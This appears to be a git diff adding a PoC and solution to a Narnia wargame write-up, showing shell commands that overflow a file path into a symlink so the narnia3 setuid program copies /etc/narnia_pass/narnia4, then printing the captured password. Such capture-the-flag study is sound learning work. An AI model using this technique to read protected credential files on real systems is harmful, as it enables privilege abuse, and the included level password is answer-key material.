@@ -219,11 +219,29 @@ int main(int argc, char **argv){
 ```
 ### PoC:
 ```
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ history
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ cd /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ls -la
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ mkdir tmp
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ls -la /tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ pwd
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ln -s /etc/narnia_pass/narnia4 pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ touch /tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ chmod 777 /tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
 ```
 ### Exploit:
 ```
+narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ cat /tmp/pwnme
+thaenohtai
+(. P$    narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$
 ```
-### Narnia4 password: ``
+### Narnia4 password: `thaenohtai`
 ## Narnia4
 ### Source code:
 ```
